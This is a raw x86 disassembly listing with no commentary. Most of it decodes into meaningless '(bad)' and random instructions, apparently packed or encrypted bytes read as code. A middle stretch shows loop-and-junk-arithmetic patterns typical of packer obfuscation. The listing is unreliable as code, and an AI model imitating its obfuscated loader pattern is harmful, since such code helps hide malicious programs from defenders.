  40a9d1:	loopne 0x40a95e
  40a9d3:	clc    
  40a9d4:	addr16 mov esp,0x2536395b
  40a9da:	(bad)  
  40a9dc:	push   0x3d1d6d38
  40a9e1:	enter  0xe5ee,0x68
  40a9e5:	mov    dh,0x44
  40a9e7:	mov    bh,0x94
  40a9e9:	fistp  QWORD PTR [ebp+ebx*2-0x63]
  40a9ed:	mov    WORD PTR [ecx-0x4b],?
  40a9f0:	cmp    eax,0x3aa6de4d
  40a9f5:	jbe    0x40a97e
  40a9f7:	popf   
  40a9f8:	pop    ebp
  40a9f9:	pop    esp
  40a9fa:	aam    0xda
  40a9fc:	outs   dx,BYTE PTR ds:[esi]
  40a9fd:	cmp    ebp,edx
  40a9ff:	sub    BYTE PTR [eax],dh
  40aa01:	cmp    DWORD PTR [ebp+0x3d5cd268],ecx
  40aa07:	or     BYTE PTR ss:[eax],dh
  40aa0a:	fs pop ebx
  40aa0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa0d:	xor    DWORD PTR [esi+0x1f20fe52],edi
  40aa13:	clc    
  40aa14:	pop    ebp
  40aa15:	lahf   
  40aa16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa17:	loopne 0x40aa40
  40aa19:	mov    esp,DWORD PTR [ebp+0x335ab361]
  40aa1f:	loopne 0x40aa08
  40aa21:	mov    WORD PTR [esi],es
  40aa23:	xchg   esp,eax
  40aa24:	mov    esi,0xbce202c7
  40aa29:	stos   BYTE PTR es:[edi],al
  40aa2a:	mov    ah,BYTE PTR [eax+ecx*8]
  40aa2d:	inc    edi
  40aa2e:	loop   0x40aa90
  40aa30:	push   es
  40aa31:	jecxz  0x40a9fe
  40aa33:	add    al,0xf3
  40aa35:	stc    
  40aa36:	mov    ch,0x18
  40aa38:	retf   0x2313
  40aa3b:	inc    eax
  40aa3c:	sbb    eax,0x550c22ef
  40aa41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa42:	jne    0x40aa53
  40aa44:	or     DWORD PTR [ecx-0x36],eax
  40aa47:	xor    BYTE PTR [esi+0x7b53eb92],al
  40aa4d:	(bad)
  40aa50:	push   0x6067a4ab
  40aa55:	(bad)  
  40aa56:	fist   DWORD PTR [edi]
  40aa58:	test   DWORD PTR [eax],esp
  40aa5a:	pop    ebp
  40aa5b:	sbb    edx,edi
  40aa5d:	inc    edi
  40aa5e:	add    BYTE PTR [edi+0x30240033],al
  40aa64:	test   al,0x8f
  40aa66:	loope  0x40aab6
  40aa68:	and    al,0x11
  40aa6a:	mov    BYTE PTR [ebx],ch
  40aa6c:	adc    eax,0xbd7cbfc2
  40aa71:	mov    ds:0x5c7d9411,al
  40aa76:	imul   esi,DWORD PTR [edx-0x25],0x63
  40aa7a:	mul    BYTE PTR [ebp-0x6e5f86fe]
  40aa80:	jle    0x40aa67
  40aa82:	push   es
  40aa83:	dec    esi
  40aa84:	lods   eax,DWORD PTR ds:[esi]
  40aa85:	test   eax,0x739e67cc
  40aa8a:	lds    eax,FWORD PTR [edx+0x62]
  40aa8d:	or     BYTE PTR [edx],0xf7
  40aa90:	mov    al,ds:0xed2eff9b
  40aa95:	push   eax
  40aa96:	ds push ss
  40aa98:	arpl   WORD PTR [ebp+ecx*8+0x7dd05520],dx
  40aa9f:	rcl    BYTE PTR [ebx+0xf],1
  40aaa2:	and    bh,BYTE PTR [eax]
  40aaa4:	push   0xffffffd2
  40aaa6:	or     al,0xe1
  40aaa8:	jno    0x40aac9
  40aaaa:	and    al,0xb2
  40aaac:	push   cs
  40aaad:	sbb    bh,BYTE PTR [edx-0x57111f73]
  40aab3:	xchg   ebp,ebp
  40aab5:	push   cs
  40aab6:	sbb    BYTE PTR [edi-0x1d],0x30
  40aaba:	sub    BYTE PTR [eax],bh
  40aabc:	push   ss
  40aabd:	lds    edx,FWORD PTR [ecx]
  40aabf:	sbb    al,BYTE PTR [eax+0xc93af56]
  40aac5:	or     eax,0x1fe1c1b1
  40aaca:	pop    edi
  40aacb:	sbb    DWORD PTR [eax],0x6c0b5970
  40aad1:	pop    ss
  40aad2:	add    DWORD PTR [ecx-0x6d2c9aa3],eax
  40aad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad9:	ja     0x40aae8
  40aadb:	mov    bl,0xe0
  40aadd:	inc    ebx
  40aade:	push   0xffffffa5
  40aae0:	fild   WORD PTR [edi]
  40aae2:	mov    ?,WORD PTR [eax+0x670f0a15]
  40aae8:	adc    ebx,DWORD PTR [ebp+0x17f7bdc8]
  40aaee:	or     bh,BYTE PTR [ebx+0x46c28835]
  40aaf4:	jg     0x40aaf5
  40aaf6:	mov    dl,0xac
  40aaf8:	ins    DWORD PTR es:[edi],dx
  40aaf9:	xor    eax,0xdbc809b5
  40aafe:	push   0xffffffd3
  40ab00:	push   ebp
  40ab01:	shl    DWORD PTR [ebp-0x47f72183],cl
  40ab07:	scas   eax,DWORD PTR es:[edi]
  40ab08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab09:	call   0x2d99d8f9
  40ab0e:	aad    0x49
  40ab10:	jg     0x40aa9a
  40ab12:	inc    ebx
  40ab13:	fisttp WORD PTR [edi]
  40ab15:	push   cs
  40ab16:	aaa    
  40ab17:	xor    cl,0x2c
  40ab1a:	xor    bl,BYTE PTR [esi-0x62]
  40ab1d:	stos   DWORD PTR es:[edi],eax
  40ab1e:	pop    ecx
  40ab1f:	mov    ah,0x75
  40ab21:	xchg   ebp,esi
  40ab23:	out    dx,al
  40ab24:	into   
  40ab25:	xchg   edi,eax
  40ab26:	pop    ecx
  40ab27:	dec    ecx
  40ab28:	xchg   DWORD PTR [edi+0xcba08ef],edi
  40ab2e:	popa   
  40ab2f:	lods   al,BYTE PTR ds:[esi]
  40ab30:	pusha  
  40ab31:	popa   
  40ab32:	and    BYTE PTR [ebx+eax*2+0x61],bl
  40ab36:	mov    ah,0xce
  40ab38:	mov    ebx,0xff638245
  40ab3d:	into   
  40ab3e:	jmp    0x517b:0xa28304f
  40ab45:	xchg   ecx,eax
  40ab46:	fisub  WORD PTR [ecx-0x75703ce5]
  40ab4c:	mov    bl,0xcf
  40ab4e:	pushf  
  40ab4f:	mov    cs,WORD PTR [ebx]
  40ab51:	cmp    eax,0x1e177db1
  40ab56:	cli    
  40ab57:	dec    ecx
  40ab58:	jo     0x40abbf
  40ab5a:	jmp    0xfe:0xec332e2b
  40ab61:	jns    0x40ab4e
  40ab63:	rol    DWORD PTR [edx+edx*8+0xf],cl
  40ab67:	vpaddq ymm3,ymm3,ymm5
  40ab6b:	jns    0x40ab9e
  40ab6d:	jl     0x40abae
  40ab6f:	adc    dh,BYTE PTR ds:0x2096cbdb
  40ab75:	jg     0x40ab2e
  40ab77:	fucomp st(2)
  40ab79:	mov    BYTE PTR [esi],ch
  40ab7b:	push   ss
  40ab7c:	dec    edi
  40ab7d:	retf   0x2bc6
  40ab80:	xor    eax,0x7430c937
  40ab85:	jne    0x40ab51
  40ab87:	xchg   edi,eax
  40ab88:	outs   dx,DWORD PTR ds:[esi]
  40ab89:	dec    eax
  40ab8a:	and    edx,ebp
  40ab8c:	adc    al,0x1c
  40ab8e:	xchg   edx,eax
  40ab8f:	xlat   BYTE PTR ds:[ebx]
  40ab90:	pop    ebp
  40ab91:	dec    ebp
  40ab92:	mov    esp,0xc833cff1
  40ab97:	(bad)  
  40ab98:	(bad)  
  40ab99:	fdivr  DWORD PTR [ecx-0x6f]
  40ab9c:	jp     0x40ab90
  40ab9e:	xchg   ecx,eax
  40ab9f:	in     eax,dx
  40aba0:	pop    es
  40aba1:	pop    edx
  40aba2:	js     0x40abb4
  40aba4:	jecxz  0x40ac1b
  40aba6:	(bad)  
  40aba7:	dec    edx
  40aba8:	(bad)  
  40aba9:	mov    al,ds:0xa1cd2b22
  40abae:	bound  ecx,QWORD PTR [edi+0x3]
  40abb1:	jmp    0x8224b464
  40abb6:	outs   dx,DWORD PTR ds:[esi]
  40abb7:	push   edi
  40abb8:	inc    ebx
  40abb9:	(bad)  
  40abba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abbb:	fist   DWORD PTR [esi+esi*1+0x71eb2e88]
  40abc2:	(bad)  
  40abc3:	lds    ecx,FWORD PTR ss:[ebp+0x361fa2a6]
  40abca:	clc    
  40abcb:	jae    0x40ab60
  40abcd:	fs mov ah,0xb8
  40abd0:	(bad)  
  40abd1:	or     eax,0x8316d7f2
  40abd6:	jns    0x40ac0b
  40abd8:	xlat   BYTE PTR ds:[ebx]
  40abd9:	add    DWORD PTR [ebx+0x15],ebx
  40abdc:	into   
  40abdd:	mov    ebx,0x3be3a348
  40abe2:	mov    ch,0xe
  40abe4:	xchg   esp,eax
  40abe5:	mov    ds:0xe0c04260,al
  40abea:	fs addr16 push ebp
  40abed:	repnz loopne 0x40ac14
  40abf0:	(bad)
  40abf4:	sbb    al,0x4a
  40abf6:	mov    eax,0xd87223c7
  40abfb:	in     al,0xb7
  40abfd:	or     al,0xa5
  40abff:	xor    BYTE PTR [ebx],0xd0
  40ac02:	xor    DWORD PTR ds:0x42fc75,0x42e68f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e683,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fc5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fcfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fc75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e677,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e677,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e677,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e1bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e273
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e677
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e677,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e0a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e0a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e0a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e0a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e0a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e277
  40acd5:	cmp    DWORD PTR ds:0x42e0a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e0a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e0a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e0b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fc61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fc61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fc61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fc81
  40ad3c:	call   DWORD PTR ds:0x42e4cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fc61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fc61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad7a
  40adb4:	nop
  40adb5:	dec    edx
  40adb6:	addr16 add edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad64
  40adc0:	push   edx
  40adc1:	stc    
  40adc2:	enter  0x48ea,0x60
  40adc6:	xor    DWORD PTR [ebx+0x7a485eb3],esp
  40adcc:	retf   
  40adcd:	lds    esp,FWORD PTR [esi+0x5febd459]
  40add3:	shr    DWORD PTR [ebx+0x5b],1
  40add6:	add    eax,DWORD PTR [esi+0x26]
  40add9:	fwait
  40adda:	inc    ebx
  40addb:	ins    DWORD PTR es:[edi],dx
  40addc:	xchg   edx,eax
  40addd:	cdq    
  40adde:	cld    
  40addf:	in     eax,0x98
  40ade1:	pop    edx
  40ade2:	sbb    dh,cl
  40ade4:	pop    ss
  40ade5:	jnp    0x40ad6b
  40ade7:	adc    eax,DWORD PTR [eax-0xa]
  40adea:	loop   0x40ae34
  40adec:	out    0x72,eax
  40adee:	and    ebx,ecx
  40adf0:	inc    edx
  40adf1:	jecxz  0x40adec
  40adf3:	mov    bh,0x32
  40adf5:	cwde   
  40adf6:	add    esi,DWORD PTR [esi-0x367a184a]
  40adfc:	jnp    0x40addb
  40adfe:	data16 rcl BYTE PTR [ebp+0x18a4e888],0xd3
  40ae06:	and    BYTE PTR [ebp-0x6f1c914c],ch
  40ae0c:	fild   DWORD PTR [edx+0x5c811db]
  40ae12:	sbb    BYTE PTR [ebp-0xdd2a818],dl
  40ae18:	mov    ds:0x8862733e,eax
  40ae1d:	pop    eax
  40ae1e:	lea    eax,[edi+0x55]
  40ae21:	or     ah,bh
  40ae23:	retf   0x8a40
  40ae26:	jnp    0x40add5
  40ae28:	out    0x48,eax
  40ae2a:	leave  
  40ae2b:	mov    ds:0xca36b4d,eax
  40ae30:	add    ecx,DWORD PTR [ebx+edi*2+0x3b]
  40ae34:	ds xor eax,0xeec279e2
  40ae3a:	push   0x15
  40ae3c:	scas   eax,DWORD PTR es:[edi]
  40ae3d:	xchg   edi,eax
  40ae3e:	sbb    DWORD PTR [ebx+0x18],eax
  40ae41:	push   esi
  40ae42:	jmp    0x925:0xdf4b5094
  40ae49:	lods   eax,DWORD PTR ds:[esi]
  40ae4a:	sti    
  40ae4b:	push   ecx
  40ae4c:	pusha  
  40ae4d:	dec    eax
  40ae4e:	sbb    al,bh
  40ae50:	add    esp,edx
  40ae52:	leave  
  40ae53:	sub    al,0x16
  40ae55:	(bad)  
  40ae56:	cld    
  40ae57:	nop
  40ae58:	test   DWORD PTR [ecx-0x5c],0x1031d8bd
  40ae5f:	push   esp
  40ae60:	jge    0x40ae90
  40ae62:	out    dx,eax
  40ae63:	or     edx,ebx
  40ae65:	inc    esp
  40ae66:	(bad)  
  40ae67:	retf   
  40ae68:	adc    BYTE PTR [eax],ch
  40ae6a:	jecxz  0x40aee0
  40ae6c:	push   esp
  40ae6d:	fst    QWORD PTR [esi]
  40ae6f:	dec    ecx
  40ae70:	clc    
  40ae71:	imul   ebp,DWORD PTR [edi],0xffffff80
  40ae74:	int    0xf5
  40ae76:	add    eax,0x9b4d3cc3
  40ae7b:	fwait
  40ae7c:	inc    esi
  40ae7d:	jl     0x40ae53
  40ae7f:	pop    eax
  40ae80:	inc    ecx
  40ae81:	call   0xf612:0x591a5064
  40ae88:	inc    esp
  40ae89:	retf   
  40ae8a:	loopne 0x40ae53
  40ae8c:	fld    QWORD PTR [eax]
  40ae8e:	out    dx,eax
  40ae8f:	or     eax,0xcb3c5f5f
  40ae94:	xor    DWORD PTR [esi-0x39],esi
  40ae97:	cwde   
  40ae98:	mov    ss,WORD PTR [edx-0x4d8e0dc8]
  40ae9e:	cld    
  40ae9f:	mov    ds:0x6adf9f07,al
  40aea4:	sbb    eax,0x5decd2a4
  40aea9:	mov    ebp,0xd42f0072
  40aeae:	(bad)  
  40aeaf:	cld    
  40aeb0:	loop   0x40af0a
  40aeb2:	mov    cl,0xa3
  40aeb4:	adc    BYTE PTR [edx+0x46],al
  40aeb7:	imul   esp,DWORD PTR [esi],0xc69c5eab
  40aebd:	jbe    0x40af10
  40aebf:	push   ebx
  40aec0:	mov    ch,0x86
  40aec2:	jno    0x40af03
  40aec4:	mov    ds:0x9815f41,eax
  40aec9:	xor    al,0x59
  40aecb:	xchg   esp,eax
  40aecc:	jle    0x40aee9
  40aece:	stos   DWORD PTR es:[edi],eax
  40aecf:	xor    BYTE PTR [edi-0x24],0x19
  40aed3:	or     DWORD PTR [esp+ebp*4+0x1e7e710e],ecx
  40aeda:	mov    dl,0x65
  40aedc:	ds mov ecx,0x686509d2
  40aee2:	inc    edx
  40aee3:	xor    dl,BYTE PTR [edi+0x1a910f04]
  40aee9:	jno    0x40aedb
  40aeeb:	push   eax
  40aeec:	or     DWORD PTR [eax+0x5d3c3319],ecx
  40aef2:	or     BYTE PTR [ecx],ah
  40aef4:	cld    
  40aef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef6:	outs   dx,DWORD PTR ds:[esi]
  40aef7:	xor    BYTE PTR [ebx-0x3e47402],dl
  40aefd:	jp     0x40af54
  40aeff:	and    BYTE PTR [eax+esi*8+0x5c07f70b],al
  40af06:	jp     0x40aea9
  40af08:	adc    al,0x2d
  40af0a:	aam    0x2c
  40af0c:	push   es
  40af0d:	sar    esp,cl
  40af0f:	cmp    bl,BYTE PTR [esi+0x12]
  40af12:	pusha  
  40af13:	cmp    al,0xf9
  40af15:	push   ebx
  40af16:	xchg   ebp,eax
  40af17:	mov    edx,0x838c51e8
  40af1c:	pop    ebp
  40af1d:	sub    eax,DWORD PTR [esi+edi*4]
  40af20:	test   DWORD PTR ss:[ebx],esi
  40af23:	or     ecx,DWORD PTR [esp+ebx*1]
  40af26:	(bad)  
  40af27:	jmp    0xd3b0c3c6
  40af2c:	out    0x5c,al
  40af2e:	outs   dx,BYTE PTR ds:[esi]
  40af2f:	cdq    
  40af30:	dec    ebx
  40af31:	jae    0x40af0d
  40af33:	push   ebx
  40af34:	mov    ah,0x4b
  40af36:	mov    ?,WORD PTR [eax-0x2c]
  40af39:	fisttp QWORD PTR [eax+ecx*8]
  40af3c:	jns    0x40af43
  40af3e:	mov    BYTE PTR [edi],dh
  40af40:	add    al,0x8c
  40af43:	dec    edx
  40af44:	sti    
  40af45:	clc    
  40af46:	cmp    DWORD PTR [ecx-0x2103f197],ebp
  40af4c:	ins    DWORD PTR es:[edi],dx
  40af4d:	gs xchg ebx,eax
  40af4f:	les    ecx,FWORD PTR [edi]
  40af51:	xlat   BYTE PTR ds:[ebx]
  40af52:	pop    ecx
  40af53:	daa    
  40af54:	sub    al,0xd3
  40af56:	das    
  40af57:	in     eax,0xa0
  40af59:	(bad)  
  40af5a:	rcl    BYTE PTR [eax],1
  40af5c:	call   0x7a8dd846
  40af61:	cli    
  40af62:	sbb    dh,BYTE PTR [ecx+0x7e127ae8]
  40af68:	(bad)  
  40af69:	fld    DWORD PTR [esi]
  40af6b:	sub    DWORD PTR [ebx],ecx
  40af6d:	shr    edi,cl
  40af6f:	pop    esp
  40af70:	mov    esp,0x139e024a
  40af75:	outs   dx,DWORD PTR ds:[esi]
  40af76:	add    DWORD PTR [eax],0x6d
  40af79:	out    0xc9,al
  40af7b:	cli    
  40af7c:	xor    eax,0xffd711d0
  40af81:	mov    WORD PTR [eax],cs
  40af83:	jnp    0x40affd
  40af85:	xor    ebp,DWORD PTR [edx+ebp*2+0x4b7b8c20]
  40af8c:	sbb    ebx,ebx
  40af8e:	ins    BYTE PTR es:[edi],dx
  40af8f:	fisub  DWORD PTR [edi]
  40af91:	push   ecx
  40af92:	jp     0x40b004
  40af94:	pop    edx
  40af95:	je     0x40af1e
  40af97:	cmc    
  40af98:	push   edx
  40af99:	pop    ebx
  40af9a:	repz mov ecx,0xf782ad24
  40afa0:	loope  0x40b016
  40afa2:	xchg   edi,eax
  40afa3:	ror    bl,1
  40afa5:	push   es
  40afa6:	clc    
  40afa7:	add    edi,DWORD PTR [edi]
  40afa9:	mov    ecx,0x2fe84b14
  40afae:	imul   ebp,DWORD PTR [esi+ebp*8+0x2d353b38],0x322b73c2
  40afb9:	enter  0x2aea,0x15
  40afbd:	mov    ah,0x39
  40afbf:	inc    ecx
  40afc0:	fcomp  QWORD PTR [ecx-0x5b]
  40afc3:	sbb    al,0xc4
  40afc5:	fidiv  DWORD PTR [esi]
  40afc7:	mov    cs,WORD PTR [esi-0x5b437ae9]
  40afcd:	fwait
  40afce:	push   es
  40afcf:	scas   eax,DWORD PTR es:[edi]
  40afd0:	rol    BYTE PTR [edi-0x6],1
  40afd3:	and    edi,edx
  40afd5:	in     al,0x54
  40afd7:	jb     0x40b030
  40afd9:	xchg   ebp,eax
  40afda:	jo     0x40afcc
  40afdc:	pop    ebp
  40afdd:	fstp   QWORD PTR [ecx]
  40afdf:	xor    ch,BYTE PTR [eax+0x59]
  40afe2:	sbb    ecx,DWORD PTR [ecx]
  40afe4:	jnp    0x40afae
  40afe6:	pushf  
  40afe7:	adc    bh,0x3b
  40afea:	inc    edx
  40afeb:	push   es
  40afec:	push   eax
  40afed:	mov    eax,DWORD PTR [eax-0x55]
  40aff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aff1:	pop    edi
  40aff2:	jns    0x40afb5
  40aff4:	(bad)  
  40aff5:	popa   
  40aff6:	ja     0x40b077
  40aff8:	mov    bl,0x1b
  40affa:	and    ecx,DWORD PTR [edi-0x527aa375]
  40b000:	iret   
  40b001:	lar    ecx,WORD PTR [ebx-0x5ecfc4c1]
  40b008:	inc    edi
  40b009:	in     eax,0xdb
  40b00b:	pop    esi
  40b00c:	imul   edx,DWORD PTR [esi+eiz*1+0x52],0x6
  40b011:	cwde   
  40b012:	outs   dx,DWORD PTR ds:[esi]
  40b013:	stos   BYTE PTR es:[edi],al
  40b014:	jle    0x40afd1
  40b016:	or     dl,BYTE PTR [edi-0x2e]
  40b019:	and    eax,0x962a31dc
  40b01e:	xchg   edx,eax
  40b01f:	dec    edi
  40b020:	outs   dx,DWORD PTR ds:[esi]
  40b021:	iret   
  40b022:	lahf   
  40b023:	mov    al,0x1f
  40b025:	mov    esp,0xc2a9d314
  40b02a:	mov    DWORD PTR [esi+0x2d63cf48],ebp
  40b030:	push   esp
  40b031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b032:	iret   
  40b033:	or     cl,bl
  40b035:	dec    ecx
  40b036:	inc    ebx
  40b037:	sub    bh,BYTE PTR [eax+eiz*4-0x502d8b22]
  40b03e:	adc    esi,DWORD PTR [eax+eax*8+0x269245fb]
  40b045:	cs sub al,0xbc
  40b048:	shr    eax,1
  40b04a:	(bad)  
  40b04b:	icebp  
  40b04c:	jb     0x40b008
  40b04e:	inc    esp
  40b04f:	ret    
  40b050:	int3   
  40b051:	ret    
  40b052:	fnstsw WORD PTR [edi+0x4c90b8e2]
  40b058:	add    al,0xb9
  40b05a:	jmp    0xa6d7:0xeae1d8b6
  40b061:	xchg   ecx,eax
  40b062:	xlat   BYTE PTR ds:[ebx]
  40b063:	cmp    DWORD PTR [eax+0x35],eax
  40b066:	aam    0x7d
  40b068:	jg     0x40b06f
  40b06a:	jp     0x40b0e9
  40b06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06d:	add    al,0x3d
  40b06f:	jo     0x40b02f
  40b071:	cmp    eax,0xaf10c7e3
  40b076:	dec    ebp
  40b077:	inc    ecx
  40b078:	adc    eax,0x43414cdb
  40b07d:	mov    WORD PTR [eax+0x1c],cs
  40b080:	cmp    ebx,0x26395c5c
  40b086:	pop    ds
  40b087:	adc    DWORD PTR [ebx+0x4ca6377c],esi
  40b08d:	aam    0x95
  40b08f:	int    0x89
  40b091:	ins    DWORD PTR es:[edi],dx
  40b092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b093:	in     eax,0xb
  40b095:	jle    0x40b095
  40b097:	js     0x40b0e0
  40b099:	cmp    DWORD PTR [esi-0x6180d596],esp
  40b09f:	xor    al,ah
  40b0a1:	jmp    FWORD PTR [ecx-0x543a68d2]
  40b0a7:	test   BYTE PTR [edx],al
  40b0a9:	inc    ebx
  40b0aa:	sbb    al,0xcd
  40b0ac:	fwait
  40b0ad:	iret   
  40b0ae:	mov    cl,BYTE PTR [edi]
  40b0b0:	bound  ebp,QWORD PTR [ebx+0x8]
  40b0b3:	xchg   DWORD PTR [ebx-0x10],edx
  40b0b6:	sar    DWORD PTR [ebp+0x3],1
  40b0b9:	int    0xc3
  40b0bb:	pop    edx
  40b0bc:	xchg   ebp,eax
  40b0bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0be:	add    esi,edi
  40b0c0:	xchg   BYTE PTR [eax+0x155046d],ah
  40b0c6:	mov    al,0xba
  40b0c8:	mov    ebp,0xde94b023
  40b0cd:	test   eax,0x16a92a28
  40b0d2:	mov    ah,0xe0
  40b0d4:	cmovs  ebp,DWORD PTR [eax]
  40b0d7:	jle    0x40b12b
  40b0d9:	add    eax,0x5416f55e
  40b0de:	jo     0x40b15c
  40b0e0:	pop    ds
  40b0e1:	icebp  
  40b0e2:	jne    0x40b087
  40b0e4:	hlt    
  40b0e5:	arpl   dx,cx
  40b0e7:	sbb    BYTE PTR [eax+0x63],cl
  40b0ea:	and    eax,0x8fe5021f
  40b0ef:	aas    
  40b0f0:	mov    al,ds:0xf4509a01
  40b0f5:	ja     0x40b0c6
  40b0f7:	and    ecx,ecx
  40b0f9:	rcr    dl,1
  40b0fb:	scas   eax,DWORD PTR es:[edi]
  40b0fc:	cmp    esi,DWORD PTR [ebx]
  40b0fe:	es dec esp
  40b100:	das    
  40b101:	mov    dl,0x1d
  40b103:	xlat   BYTE PTR ds:[ebx]
  40b104:	dec    eax
  40b105:	fistp  QWORD PTR [ebx-0x18]
  40b108:	cld    
  40b109:	xchg   esp,eax
  40b10a:	xchg   esp,eax
  40b10b:	loopne 0x40b099
  40b10d:	not    BYTE PTR [ebx]
  40b10f:	sbb    al,0x24
  40b111:	push   cs
  40b112:	jl     0x40b0f0
  40b114:	paddd  mm4,QWORD PTR [edi]
  40b117:	das    
  40b118:	outs   dx,DWORD PTR ds:[esi]
  40b119:	or     BYTE PTR [eax],0x67
  40b11c:	hlt    
  40b11d:	mov    edx,esi
  40b11f:	add    eax,DWORD PTR [edx-0x43]
  40b122:	ret    0x1604
  40b125:	push   esp
  40b126:	stos   DWORD PTR es:[edi],eax
  40b127:	mov    BYTE PTR [edi+0x57],dl
  40b12a:	add    DWORD PTR [edi+ebp*4],edi
  40b12d:	leave  
  40b12e:	jbe    0x40b142
  40b130:	xchg   ebp,eax
  40b131:	cmp    BYTE PTR [ecx+0x72a671ac],dh
  40b137:	pop    edi
  40b138:	xor    eax,0x2ac3d974
  40b13d:	ja     0x40b140
  40b13f:	inc    edi
  40b140:	sub    al,0xd5
  40b142:	sub    DWORD PTR [ecx],ecx
  40b144:	cmp    esi,DWORD PTR ds:0x7c60b4f5
  40b14a:	pop    edi
  40b14b:	pusha  
  40b14c:	mov    bl,0x29
  40b14e:	fldenv [ebp-0x53]
  40b151:	pushf  
  40b152:	fcmovb st,st(0)
  40b154:	sbb    eax,0x18276ffa
  40b159:	retf   0xac1b
  40b15c:	gs (bad) 
  40b15e:	xor    ebx,ebp
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	xchg   DWORD PTR [esi+0x5d],ebx
  40b176:	fbld   TBYTE PTR [edx-0x608f8f06]
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1b6
  40b180:	outs   dx,BYTE PTR ds:[esi]
  40b181:	mov    dh,BYTE PTR fs:[edx-0x64b9055e]
  40b188:	or     eax,DWORD PTR [esi+0x17ab9409]
  40b18e:	push   edi
  40b18f:	cli    
  40b190:	aaa    
  40b191:	scas   eax,DWORD PTR es:[edi]
  40b192:	push   esi
